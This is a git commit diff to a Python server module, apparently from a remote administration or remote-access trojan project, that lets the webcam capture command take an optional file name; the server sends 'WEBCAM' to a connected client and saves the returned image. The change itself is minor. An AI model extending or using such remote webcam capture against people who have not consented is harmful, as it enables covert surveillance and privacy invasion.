f2390452da1aef52b39649dd1ef46c0e38f2d351
Y4hL <43219534+Y4hL@users.noreply.github.com>
2023-09-06 19:11:37 +0300

    Allow specifying file name for webcam call

--- server/modules/webcam.py
+++ server/modules/webcam.py
@@ -5,7 +5,8 @@ from datetime import datetime
 from modules.clients import Client
 from utils.timeout_handler import TimeoutSetter
 
-def webcam(client: Client) -> str:
+
+def webcam(client: Client, filename: str = None) -> str:
     """ Capture webcam """
     logging.debug('Capturing webcam (%s)', client.id)
     client.write(b'WEBCAM')
@@ -17,7 +18,9 @@ def webcam(client: Client) -> str:
         logging.error('Unable to capture webcam (%s)', client.id)
         raise RuntimeError('Unable to capture webcam')
 
-    filename = f'webcam-{datetime.now()}.png'.replace(':', '-')
+    if filename is None:
+        filename = f'webcam-{datetime.now()}.png'.replace(':', '-')
+
     with open(filename, 'wb') as file:
         file.write(img_data)
     logging.info('Saved webcam capture at (%s): %s', client.id, filename)
